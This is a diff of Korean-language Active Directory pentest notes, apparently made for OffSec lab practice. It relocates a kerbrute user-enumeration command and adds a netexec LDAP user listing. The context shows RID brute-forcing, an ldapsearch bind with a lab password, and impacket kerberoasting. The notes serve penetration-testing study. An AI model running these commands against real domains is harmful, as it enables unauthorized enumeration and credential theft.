@@ -2,8 +2,6 @@
 ```bash
 netexec smb [ip] -u guest -p '' --rid-brute
 
-./kerbrute_linux_amd64 userenum --dc 192.168.133.40 -d haero /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
-
 ./enum4linux <ip>
 ```
 ---
@@ -22,6 +20,10 @@ ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch
 - `-x` : 기본 SASL 인증 대신 간단한 익명 또는 아이디-비밀번호 기반 인증을 사용
 - `-b` :  LDAP 검색을 시작할 루트 경로를 의미. `DC=hutch,DC=offsec` → `hutch.offsec` 도메인을 의미
 - `"(objectclass=*)"` : 모든 객체(Object)를 가져오라는 의미
+
+```bash
+netexec ldap <domain> -u <id> -p <password> --users
+```
 ---
 # AS-REP Roasting
 ``` bash
@@ -61,6 +63,8 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 
 ```bash
 impacket-GetUsersSPNs -request -dc-ip <ip> <domain>/<user> -no-pass
+
+./kerbrute_linux_amd64 userenum --dc 192.168.133.40 -d haero /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
 ---
 # Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
